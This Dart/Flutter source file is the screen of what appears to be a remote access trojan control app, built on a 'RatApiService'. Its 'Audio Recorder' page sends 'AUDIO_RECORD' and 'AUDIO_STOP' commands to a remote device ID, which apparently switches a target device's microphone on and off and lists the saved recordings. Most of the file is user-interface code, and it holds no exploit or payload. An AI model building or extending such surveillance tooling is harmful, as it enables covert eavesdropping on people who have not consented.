import 'dart:async';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';
import 'api_service.dart';

// ============================================================
// GRID PATTERN PAINTER
// ============================================================
class _AudioGridPatternPainter extends CustomPainter {
  final Color gridColor;
  final double spacing;
  
  const _AudioGridPatternPainter({
    required this.gridColor,
    this.spacing = 25,
  });
  
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = gridColor
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.6;
    
    for (double x = 0; x < size.width; x += spacing) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    
    for (double y = 0; y < size.height; y += spacing) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }
  
  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

const _kBg    = Color(0xFF111827);
const _kCard  = Color(0xFF1F2937);
const _kBlue  = Color(0xFF3B82F6);
const _kCyan  = Color(0xFF06B6D4);
const _kRed   = Color(0xFFEF4444);
const _kSub   = Color(0xFF9CA3AF);

class AudioRecordScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;
  const AudioRecordScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<AudioRecordScreen> createState() => _AudioRecordScreenState();
}

class _AudioRecordScreenState extends State<AudioRecordScreen> with SingleTickerProviderStateMixin {
  late RatApiService _api;
  bool _isRecording = false, _isLoading = false;
  String _status = 'Ready to record';
  DateTime? _start;
  Timer? _timer;
  late AnimationController _pulse;
  List<String> _recordings = [];

  @override
  void initState() {
    super.initState();
    _api = RatApiService(widget.sessionKey);
    _pulse = AnimationController(duration: const Duration(milliseconds: 1000), vsync: this)..repeat(reverse: true);
  }

  @override
  void dispose() {
    _timer?.cancel();
    _pulse.dispose();
    if (_isRecording) _stop();
    super.dispose();
  }

  Future<void> _start2() async {
    setState(() { _isLoading = true; _status = 'Starting...'; });
    try {
      await _api.sendCommand(widget.deviceId, 'AUDIO_RECORD');
      setState(() { _isRecording = true; _isLoading = false; _status = 'Recording...'; _start = DateTime.now(); });
      _timer = Timer.periodic(const Duration(seconds: 1), (_) { if (mounted) setState(() {}); });
    } catch (e) { setState(() { _status = 'Error: $e'; _isLoading = false; }); }
  }

  Future<void> _stop() async {
    setState(() { _isLoading = true; _status = 'Stopping...'; });
    try {
      _timer?.cancel();
      await _api.sendCommand(widget.deviceId, 'AUDIO_STOP');
      final name = 'audio_${DateTime.now().millisecondsSinceEpoch}.mp3';
      setState(() { _isRecording = false; _isLoading = false; _status = 'Saved'; _recordings.insert(0, name); _start = null; });
    } catch (e) { setState(() { _status = 'Error: $e'; _isLoading = false; }); }
  }

  String _duration() {
    if (_start == null) return '00:00';
    final d = DateTime.now().difference(_start!);
    return '${d.inMinutes.toString().padLeft(2,'0')}:${(d.inSeconds%60).toString().padLeft(2,'0')}';
  }

  Widget _buildGridBackground() {
    return Positioned.fill(
      child: CustomPaint(
        painter: _AudioGridPatternPainter(
          gridColor: Colors.white.withOpacity(0.03),
          spacing: 30,
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          _buildGridBackground(),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  Colors.black.withOpacity(0.85),
                  _kBlue.withOpacity(0.05),
                  Colors.black.withOpacity(0.9)
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
            ),
          ),
          SafeArea(
            child: Column(children: [
              // Header
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
                child: Row(children: [
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)), child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white70, size: 16)),
                  ),
                  const SizedBox(width: 12),
                  Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(gradient: LinearGradient(colors: _isRecording ? [_kRed, Color(0xFFDC2626)] : [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(10)), child: const Icon(Icons.mic_rounded, color: Colors.white, size: 18)),
                  const SizedBox(width: 12),
                  const Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    Text('Audio Recorder', style: TextStyle(color: Colors.white, fontSize: 15, fontWeight: FontWeight.w700)),
                    Text('Remote microphone recording', style: TextStyle(color: _kSub, fontSize: 11)),
                  ])),
                ]),
              ),

              // Visualizer
              Expanded(
                flex: 2,
                child: Center(
                  child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                    AnimatedBuilder(
                      animation: _pulse,
                      builder: (_, __) => Container(
                        width: 130 + (_isRecording ? _pulse.value * 20 : 0),
                        height: 130 + (_isRecording ? _pulse.value * 20 : 0),
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(colors: _isRecording
                            ? [_kRed.withOpacity(0.3), _kRed.withOpacity(0.05), Colors.transparent]
                            : [_kBlue.withOpacity(0.2), Colors.transparent]),
                        ),
                        child: Center(
                          child: Container(
                            width: 90, height: 90,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              gradient: _isRecording ? const LinearGradient(colors: [_kRed, Color(0xFFDC2626)]) : const LinearGradient(colors: [_kBlue, _kCyan]),
                              boxShadow: [BoxShadow(color: (_isRecording ? _kRed : _kBlue).withOpacity(0.4), blurRadius: 20)],
                            ),
                            child: Icon(_isRecording ? Icons.mic_rounded : Icons.mic_none_rounded, color: Colors.white, size: 40),
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(height: 20),
                    Text(_status, style: TextStyle(color: _isRecording ? _kRed : Colors.white, fontSize: 15, fontWeight: FontWeight.w600)),
                    if (_isRecording) ...[
                      const SizedBox(height: 10),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 10),
                        decoration: BoxDecoration(color: _kRed.withOpacity(0.1), borderRadius: BorderRadius.circular(20), border: Border.all(color: _kRed.withOpacity(0.4))),
                        child: Text(_duration(), style: const TextStyle(color: _kRed, fontSize: 22, fontWeight: FontWeight.w800)),
                      ),
                    ],
                  ]),
                ),
              ),

              // Recordings
              if (_recordings.isNotEmpty)
                Expanded(
                  flex: 1,
                  child: Container(
                    margin: const EdgeInsets.fromLTRB(16, 0, 16, 12),
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(gradient: LinearGradient(colors: [_kCard.withOpacity(0.95), _kBg.withOpacity(0.95)]), borderRadius: BorderRadius.circular(14), border: Border.all(color: _kBlue.withOpacity(0.2))),
                    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                      const Text('Recordings', style: TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w700)),
                      const SizedBox(height: 8),
                      Expanded(child: ListView.builder(
                        itemCount: _recordings.length,
                        physics: const BouncingScrollPhysics(),
                        itemBuilder: (_, i) => Container(
                          margin: const EdgeInsets.only(bottom: 6),
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
                          decoration: BoxDecoration(color: Colors.black.withOpacity(0.3), borderRadius: BorderRadius.circular(8), border: Border.all(color: _kBlue.withOpacity(0.15))),
                          child: Row(children: [
                            const Icon(Icons.audiotrack_rounded, color: _kBlue, size: 16),
                            const SizedBox(width: 8),
                            Expanded(child: Text(_recordings[i], style: const TextStyle(color: Colors.white70, fontSize: 11), overflow: TextOverflow.ellipsis)),
                            const Icon(Icons.download_rounded, color: _kCyan, size: 18),
                          ]),
                        ),
                      )),
                    ]),
                  ),
                ),

              // Control button
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                child: GestureDetector(
                  onTap: _isLoading ? null : (_isRecording ? _stop : _start2),
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 16),
                    decoration: BoxDecoration(
                      gradient: _isLoading ? null : LinearGradient(colors: _isRecording ? [_kRed, const Color(0xFFDC2626)] : [_kBlue, _kCyan]),
                      color: _isLoading ? Colors.grey.shade800 : null,
                      borderRadius: BorderRadius.circular(14),
                      boxShadow: _isLoading ? [] : [BoxShadow(color: (_isRecording ? _kRed : _kBlue).withOpacity(0.4), blurRadius: 16)],
                    ),
                    child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                      _isLoading
                        ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                        : Icon(_isRecording ? Icons.stop_rounded : Icons.fiber_manual_record_rounded, color: Colors.white, size: 22),
                      const SizedBox(width: 10),
                      Text(_isRecording ? 'Stop Recording' : 'Start Recording', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 15)),
                    ]),
                  ),
                ),
              ),
            ]),
          ),
        ],
      ),
    );
  }
}